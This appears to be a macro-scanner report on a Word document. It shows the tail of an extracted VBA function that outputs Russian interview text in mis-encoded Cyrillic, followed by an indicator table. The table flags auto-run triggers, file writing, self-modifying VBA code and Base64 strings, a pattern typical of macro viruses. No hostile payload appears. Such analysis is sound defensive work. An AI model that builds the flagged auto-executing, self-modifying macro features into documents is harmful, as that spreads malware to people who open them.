    Artikel_3$ = "- Ìû â ýòîì óâåðåíû, íî ê òðóäíîñòÿì ïðèâûêëè, è ñ÷èòàåì çàäà÷ó âïîëíå ðàçðåøèìîé. Êàê ãîâîðèòñÿ â ïîãîâîðêå: ""äîðîãó îñèëèò èäóùèé""."
   Case 19
    Artikel_3$ = "- Æåëàþ Âàì óñïåõà. Âñåãî õîðîøåãî !"
   Case 20
    Artikel_3$ = "- Äî ñâèäàíèÿ."
   Case Else
    Artikel_3$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_3$ = "Áåñåäó ïðîâîäèë íàø êîððåñïîíäåíò  Ì. Â. ×óðèëîâ"
 End If
End Function














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

